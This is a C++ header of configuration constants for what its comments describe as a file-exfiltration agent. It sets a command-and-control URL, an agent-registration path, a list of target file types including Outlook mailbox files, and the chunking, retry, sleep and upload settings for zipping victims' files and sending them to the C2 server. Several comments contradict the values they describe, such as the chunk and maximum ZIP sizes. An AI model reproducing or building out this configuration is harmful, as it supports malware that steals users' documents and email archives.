#pragma once


// This means the program will run only once [main.cpp]
constexpr bool ONETIMERUN = true;

// This is the given list of URLs that we can query to find a valid C2 URL [main.cpp]
std::vector<std::wstring> URLS = { L"https://10.0.0.113:5000" };

// This is the list of file extensions that we are going to search for [main.cpp]
std::vector<std::wstring> FILE_EXTS = { L".txt", L".xml", L".jpg", L".pdf", L".png", L".docx", L".xlsx", L".xls", L".csv", L".ppt", L".epub", L".xlsm", L".pptx", L".pst", L".ost", L".one"};

// This is the URL path where agent will connect to for adding the agent to the list of targets on C2 [main.cpp]
std::wstring STAGE1PATH = L"/add_agent";


// Timeout duration for adding agent and sending data to C2 [addagent.hpp, senddata.hpp]
DWORD TIMEOUT = 120 * 1000; 

// Number of times to retry when connection is interrupted [senddata.hpp]
const int RETRIES = 3;

// chunk size for file uploads is 10MB, this means that the file will be divided into chunks and each chunk is 10MB [senddata.hpp]
static constexpr size_t CHUNK_SIZE = 3000 * 1024;


// Number of seconds to sleep before retrying connection & sending data to C2 again [senddata.hpp]
int SLEEP = 10000;

// Number of seconds to sleep before retrying connection with the list of C2 URLs; [c2_resolv.hpp]
// if first attempt to find a live C2 failed, sleep for nth seconds and do it again
int C2SLEEP = 60000;

// Number of seconds to wait before timing out a request when connecting to each C2 URL [c2_resolv.hpp]
DWORD C2TIMEOUT = 10000;


// Number of seconds to wait before timing out request to Google [google_resolv.hpp]
int GTIMEOUT = 10000;

// Number of times you have to try connecting to Google [google_resolv.hpp]
int GRETRIES = 3;

// Number of seconds to sleep for before retrying connection with Google after failed attempts [google_resolv.hpp]
int GSLEEP = 20000;


// Max file size for every ZIP file that is going to be uploaded to the C2; default: 3GB [file_search.hpp]
constexpr std::int64_t MAX_SIZE_BYTES = static_cast<std::int64_t>(1000) * 1024 * 1024;

// Number of milli-seconds to sleep before searching each directory [file_search.hpp]
int FSLEEP = 0;


// File upload and speed test URL paths
std::wstring UPLOADPATH = L"/upload";



